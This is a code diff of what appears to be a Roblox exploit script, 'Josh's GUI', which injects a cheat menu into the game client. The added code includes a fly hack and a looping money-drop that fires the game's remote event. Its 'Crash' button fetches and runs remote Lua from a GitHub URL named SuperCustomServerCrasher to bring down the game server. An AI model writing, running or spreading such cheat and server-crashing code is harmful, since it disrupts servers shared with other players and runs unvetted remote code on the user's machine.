@@ -2,70 +2,35 @@
 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
+local drop = Instance.new("TextButton")
+local fly = Instance.new("TextButton")
 local TextLabel = Instance.new("TextLabel")
 local TextLabel_2 = Instance.new("TextLabel")
-local SwagCrash = Instance.new("TextButton")
-local Drop = Instance.new("TextButton")
-local Fly = Instance.new("TextButton")
+local CRASHER = Instance.new("TextButton")
+local MAIN = Instance.new("TextLabel")
 local TextLabel_3 = Instance.new("TextLabel")
-local TextLabel_4 = Instance.new("TextLabel")
-local TextLabel_5 = Instance.new("TextLabel")
-local TextLabel_6 = Instance.new("TextLabel")
-local Admin = Instance.new("TextButton")
-local Club = Instance.new("TextButton")
-local Bank = Instance.new("TextButton")
 
 --Properties:
 
 ScreenGui.Parent = game.CoreGui
 
 Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
-Frame.Position = UDim2.new(0.227163851, 0, 0.163021863, 0)
-Frame.Size = UDim2.new(0, 346, 0, 208)
+Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+Frame.BorderColor3 = Color3.fromRGB(31, 31, 31)
+Frame.Position = UDim2.new(0.332891226, 0, 0.22067596, 0)
+Frame.Size = UDim2.new(0, 305, 0, 217)
 
-TextLabel.Parent = Frame
-TextLabel.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel.BorderColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel.Position = UDim2.new(0, 0, -0.0736842155, 0)
-TextLabel.Size = UDim2.new(0, 346, 0, 14)
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = ""
-TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.TextSize = 14.000
-
-TextLabel_2.Parent = Frame
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel_2.BorderColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel_2.Position = UDim2.new(-0.115671642, 0, -0.0736841783, 0)
-TextLabel_2.Size = UDim2.new(0, 66, 0, 223)
-TextLabel_2.Font = Enum.Font.SourceSans
-TextLabel_2.Text = ""
-TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.TextSize = 14.000
-
-SwagCrash.Name = "Swag Crash"
-SwagCrash.Parent = Frame
-SwagCrash.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-SwagCrash.BorderColor3 = Color3.fromRGB(52, 52, 52)
-SwagCrash.Position = UDim2.new(-0.100746267, 0, 0.321052641, 0)
-SwagCrash.Size = UDim2.new(0, 52, 0, 24)
-SwagCrash.Font = Enum.Font.SourceSans
-SwagCrash.Text = "Crasher"
-SwagCrash.TextColor3 = Color3.fromRGB(255, 255, 255)
-SwagCrash.TextSize = 14.000
-
-Drop.Name = "Drop"
-Drop.Parent = Frame
-Drop.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-Drop.BorderColor3 = Color3.fromRGB(52, 52, 52)
-Drop.Position = UDim2.new(0.364355981, 0, 0.284210533, 0)
-Drop.Size = UDim2.new(0, 109, 0, 31)
-Drop.Font = Enum.Font.Gotham
-Drop.Text = "Drop"
-Drop.TextColor3 = Color3.fromRGB(255, 255, 255)
-Drop.TextSize = 14.000
-Drop.MouseButton1Down:connect(function()
+drop.Name = "drop"
+drop.Parent = Frame
+drop.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+drop.BorderColor3 = Color3.fromRGB(21, 21, 21)
+drop.Position = UDim2.new(0.298360646, 0, 0.322580665, 0)
+drop.Size = UDim2.new(0, 157, 0, 50)
+drop.Font = Enum.Font.GothamBold
+drop.Text = "Drop"
+drop.TextColor3 = Color3.fromRGB(247, 247, 247)
+drop.TextSize = 14.000
+drop.MouseButton1Down:connect(function()
 	Drops = false
 	player = game.Players.LocalPlayer
 	MainEvent = game:GetService('ReplicatedStorage').MainEvent
@@ -94,249 +59,179 @@ Drop.MouseButton1Down:connect(function()
 	end)
 end)
 
-Fly.Name = "Fly"
-Fly.Parent = Frame
-Fly.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-Fly.BorderColor3 = Color3.fromRGB(52, 52, 52)
-Fly.Position = UDim2.new(0.364355981, 0, 0.494736761, 0)
-Fly.Size = UDim2.new(0, 109, 0, 31)
-Fly.Font = Enum.Font.Ubuntu
-Fly.Text = "Fly (X)"
-Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
-Fly.TextSize = 14.000
-Fly.MouseButton1Down:connect(function()
-		local plr = game.Players.LocalPlayer
-		local mouse = plr:GetMouse()
+fly.Name = "fly"
+fly.Parent = Frame
+fly.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+fly.BorderColor3 = Color3.fromRGB(21, 21, 21)
+fly.Position = UDim2.new(0.298360646, 0, 0.668202758, 0)
+fly.Size = UDim2.new(0, 157, 0, 50)
+fly.Font = Enum.Font.GothamBold
+fly.Text = "Fly [X] "
+fly.TextColor3 = Color3.fromRGB(255, 255, 255)
+fly.TextSize = 14.000
+fly.MouseButton1Down:connect(function()
+	local plr = game.Players.LocalPlayer
+	local mouse = plr:GetMouse()
 
-		localplayer = plr
+	localplayer = plr
 
-		if workspace:FindFirstChild("Core") then
-			workspace.Core:Destroy()
-		end
+	if workspace:FindFirstChild("Core") then
+		workspace.Core:Destroy()
+	end
 
-		local Core = Instance.new("Part")
-		Core.Name = "Core"
-		Core.Size = Vector3.new(0.05, 0.05, 0.05)
+	local Core = Instance.new("Part")
+	Core.Name = "Core"
+	Core.Size = Vector3.new(0.05, 0.05, 0.05)
 
-		spawn(function()
-			Core.Parent = workspace
-			local Weld = Instance.new("Weld", Core)
-			Weld.Part0 = Core
-			Weld.Part1 = localplayer.Character.LowerTorso
-			Weld.C0 = CFrame.new(0, 0, 0)
-		end)
-
-		workspace:WaitForChild("Core")
-
-		local torso = workspace.Core
-		flying = true
-		local speed=10
-		local keys={a=false,d=false,w=false,s=false}
-		local e1
-		local e2
-		local function start()
-			local pos = Instance.new("BodyPosition",torso)
-			local gyro = Instance.new("BodyGyro",torso)
-			pos.Name="EPIXPOS"
-			pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
-			pos.position = torso.Position
-			gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-			gyro.cframe = torso.CFrame
-			repeat
-				wait()
-				localplayer.Character.Humanoid.PlatformStand=true
-				local new=gyro.cframe - gyro.cframe.p + pos.position
-				if not keys.w and not keys.s and not keys.a and not keys.d then
-					speed=5
-				end
-				if keys.w then
-					new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
-					speed=speed+0
-				end
-				if keys.s then
-					new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
-					speed=speed+0
-				end
-				if keys.d then
-					new = new * CFrame.new(speed,0,0)
-					speed=speed+0
-				end
-				if keys.a then
-					new = new * CFrame.new(-speed,0,0)
-					speed=speed+0
-				end
-				if speed>10 then
-					speed=5
-				end
-				pos.position=new.p
-				if keys.w then
-					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
-				elseif keys.s then
-					gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
-				else
-					gyro.cframe = workspace.CurrentCamera.CoordinateFrame
-				end
-			until flying == false
-			if gyro then gyro:Destroy() end
-			if pos then pos:Destroy() end
-			flying=false
-			localplayer.Character.Humanoid.PlatformStand=false
-			speed=10
-		end
-		e1=mouse.KeyDown:connect(function(key)
-			if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
-			if key=="w" then
-				keys.w=true
-			elseif key=="s" then
-				keys.s=true
-			elseif key=="a" then
-				keys.a=true
-			elseif key=="d" then
-				keys.d=true
-			elseif key=="x" then
-				if flying==true then
-					flying=false
-				else
-					flying=true
-					start()
-				end
-			end
-		end)
-		e2=mouse.KeyUp:connect(function(key)
-			if key=="w" then
-				keys.w=false
-			elseif key=="s" then
-				keys.s=false
-			elseif key=="a" then
-				keys.a=false
-			elseif key=="d" then
-				keys.d=false
-			end
-		end)
-		start()
+	spawn(function()
+		Core.Parent = workspace
+		local Weld = Instance.new("Weld", Core)
+		Weld.Part0 = Core
+		Weld.Part1 = localplayer.Character.LowerTorso
+		Weld.C0 = CFrame.new(0, 0, 0)
 	end)
+
+	workspace:WaitForChild("Core")
+
+	local torso = workspace.Core
+	flying = true
+	local speed=10
+	local keys={a=false,d=false,w=false,s=false}
+	local e1
+	local e2
+	local function start()
+		local pos = Instance.new("BodyPosition",torso)
+		local gyro = Instance.new("BodyGyro",torso)
+		pos.Name="EPIXPOS"
+		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+		pos.position = torso.Position
+		gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+		gyro.cframe = torso.CFrame
+		repeat
+			wait()
+			localplayer.Character.Humanoid.PlatformStand=true
+			local new=gyro.cframe - gyro.cframe.p + pos.position
+			if not keys.w and not keys.s and not keys.a and not keys.d then
+				speed=5
+			end
+			if keys.w then
+				new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+				speed=speed+0
+			end
+			if keys.s then
+				new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+				speed=speed+0
+			end
+			if keys.d then
+				new = new * CFrame.new(speed,0,0)
+				speed=speed+0
+			end
+			if keys.a then
+				new = new * CFrame.new(-speed,0,0)
+				speed=speed+0
+			end
+			if speed>10 then
+				speed=5
+			end
+			pos.position=new.p
+			if keys.w then
+				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
+			elseif keys.s then
+				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
+			else
+				gyro.cframe = workspace.CurrentCamera.CoordinateFrame
+			end
+		until flying == false
+		if gyro then gyro:Destroy() end
+		if pos then pos:Destroy() end
+		flying=false
+		localplayer.Character.Humanoid.PlatformStand=false
+		speed=10
+	end
+	e1=mouse.KeyDown:connect(function(key)
+		if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
+		if key=="w" then
+			keys.w=true
+		elseif key=="s" then
+			keys.s=true
+		elseif key=="a" then
+			keys.a=true
+		elseif key=="d" then
+			keys.d=true
+		elseif key=="x" then
+			if flying==true then
+				flying=false
+			else
+				flying=true
+				start()
+			end
+		end
+	end)
+	e2=mouse.KeyUp:connect(function(key)
+		if key=="w" then
+			keys.w=false
+		elseif key=="s" then
+			keys.s=false
+		elseif key=="a" then
+			keys.a=false
+		elseif key=="d" then
+			keys.d=false
+		end
+	end)
+	start()
 end)
 
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+TextLabel.BorderColor3 = Color3.fromRGB(15, 15, 15)
+TextLabel.Position = UDim2.new(0, 0, -0.124423966, 0)
+TextLabel.Size = UDim2.new(0, 305, 0, 38)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = ""
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+TextLabel_2.BorderColor3 = Color3.fromRGB(15, 15, 15)
+TextLabel_2.Position = UDim2.new(-0.245901644, 0, -0.124423966, 0)
+TextLabel_2.Size = UDim2.new(0, 81, 0, 244)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = ""
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 14.000
+
+CRASHER.Name = "CRASHER"
+CRASHER.Parent = Frame
+CRASHER.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+CRASHER.BorderColor3 = Color3.fromRGB(31, 31, 31)
+CRASHER.Position = UDim2.new(-0.209836066, 0, 0.322580636, 0)
+CRASHER.Size = UDim2.new(0, 59, 0, 40)
+CRASHER.Font = Enum.Font.GothamBold
+CRASHER.Text = "Crash"
+CRASHER.TextColor3 = Color3.fromRGB(255, 255, 255)
+CRASHER.TextSize = 14.000
+CRASHER.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+MAIN.Name = "MAIN"
+MAIN.Parent = Frame
+MAIN.BackgroundColor3 = Color3.fromRGB(118, 11, 11)
+MAIN.BorderColor3 = Color3.fromRGB(118, 11, 11)
+MAIN.Position = UDim2.new(0.0196721312, 0, 0.0506912433, 0)
+MAIN.Size = UDim2.new(0, 299, 0, 42)
+MAIN.Font = Enum.Font.GothamBold
+MAIN.Text = "Josh's GUI"
+MAIN.TextColor3 = Color3.fromRGB(255, 255, 255)
+MAIN.TextSize = 24.000
+
 TextLabel_3.Parent = Frame
-TextLabel_3.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel_3.BorderColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel_3.Position = UDim2.new(-0.100746267, 0, 0.884210467, 0)
-TextLabel_3.Size = UDim2.new(0, 62, 0, 12)
-TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+TextLabel_3.BorderColor3 = Color3.fromRGB(15, 15, 15)
+TextLabel_3.Position = UDim2.new(-0.245901644, 0, 0.769585252, 0)
+TextLabel_3.Size = UDim2.new(0, 81, 0, 50)
+TextLabel_3.Font = Enum.Font.GothamBlack
 TextLabel_3.Text = ".Joshh#2000"
 TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.TextSize = 13.000
-
-TextLabel_4.Parent = Frame
-TextLabel_4.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel_4.BorderColor3 = Color3.fromRGB(33, 33, 33)
-TextLabel_4.Position = UDim2.new(-0.0708955228, 0, -0.0736842081, 0)
-TextLabel_4.Size = UDim2.new(0, 84, 0, 14)
-TextLabel_4.Font = Enum.Font.Cartoon
-TextLabel_4.Text = "Josh's Selling GUI"
-TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.TextSize = 14.000
-
-TextLabel_5.Parent = Frame
-TextLabel_5.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-TextLabel_5.BorderColor3 = Color3.fromRGB(52, 52, 52)
-TextLabel_5.Position = UDim2.new(-0.108208954, 0, 0.115789473, 0)
-TextLabel_5.Size = UDim2.new(0, 56, 0, 22)
-TextLabel_5.Font = Enum.Font.SourceSans
-TextLabel_5.Text = "Main"
-TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.TextSize = 14.000
-
-TextLabel_6.Parent = Frame
-TextLabel_6.BackgroundColor3 = Color3.fromRGB(99, 3, 3)
-TextLabel_6.BorderColor3 = Color3.fromRGB(99, 3, 3)
-TextLabel_6.Position = UDim2.new(0.149253711, 0, 0.0473684147, 0)
-TextLabel_6.Size = UDim2.new(0, 278, 0, 35)
-TextLabel_6.Font = Enum.Font.ArialBold
-TextLabel_6.Text = "Josh's GUI"
-TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_6.TextSize = 24.000
-
-Admin.Name = "Admin"
-Admin.Parent = Frame
-Admin.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-Admin.BorderColor3 = Color3.fromRGB(52, 52, 52)
-Admin.Position = UDim2.new(0.364355981, 0, 0.746457458, 0)
-Admin.Size = UDim2.new(0, 109, 0, 40)
-Admin.Font = Enum.Font.SourceSans
-Admin.Text = "Admin Base"
-Admin.TextColor3 = Color3.fromRGB(255, 255, 255)
-Admin.TextSize = 14.000
-
-Club.Name = "Club"
-Club.Parent = Frame
-Club.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-Club.BorderColor3 = Color3.fromRGB(52, 52, 52)
-Club.Position = UDim2.new(0.736941993, 0, 0.284210503, 0)
-Club.Size = UDim2.new(0, 83, 0, 31)
-Club.Font = Enum.Font.SourceSans
-Club.Text = "Club"
-Club.TextColor3 = Color3.fromRGB(255, 255, 255)
-Club.TextSize = 14.000
-
-Bank.Name = "Bank"
-Bank.Parent = Frame
-Bank.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-Bank.BorderColor3 = Color3.fromRGB(52, 52, 52)
-Bank.Position = UDim2.new(0.0982658938, 0, 0.284210503, 0)
-Bank.Size = UDim2.new(0, 76, 0, 31)
-Bank.Font = Enum.Font.SourceSans
-Bank.Text = "Bank"
-Bank.TextColor3 = Color3.fromRGB(255, 255, 255)
-Bank.TextSize = 14.000
-
--- Scripts:
-
-local function GQHVC_fake_script() -- SwagCrash.LocalScript 
-	local script = Instance.new('LocalScript', SwagCrash)
-
-	script.Parent.MouseButton1Down:connect(function()
-		script.Parent.Parent["Crash Tab"].Visible = true
-	end)
-	
-end
-coroutine.wrap(GQHVC_fake_script)()
-local function TYBVF_fake_script() -- Drop.LocalScript 
-	local script = Instance.new('LocalScript', Drop)
-
-	Drops = false
-	player = game.Players.LocalPlayer
-	MainEvent = game:GetService('ReplicatedStorage').MainEvent
-	
-	script.Parent.MouseButton1Click:Connect(function()	
-		Drops = true
-		while Drops == true do
-			wait(0.1)
-			local DropAm = 10000
-			if player.DataFolder.Currency.Value > 10000 then
-				DropAm = '10000'
-			else
-				DropAm = tostring(player.DataFolder.Currency.Value)
-			end
-			local args = {
-				'DropMoney',
-				DropAm
-			}
-			MainEvent:FireServer(unpack(args))
-		end
-	end)
-	script.Parent.Parent.undrop.MouseButton1Click:Connect(function()	
-		if Drops == true then
-			Drops = false
-		end
-	end)
-	
-end
-coroutine.wrap(TYBVF_fake_script)()
-local function YWADS_fake_script() -- Frame.LocalScript 
-	local script = Instance.new('LocalScript', Frame)
-
-	print("Hello world!")
-	
-end
-coroutine.wrap(YWADS_fake_script)()
+TextLabel_3.TextSize = 12.000
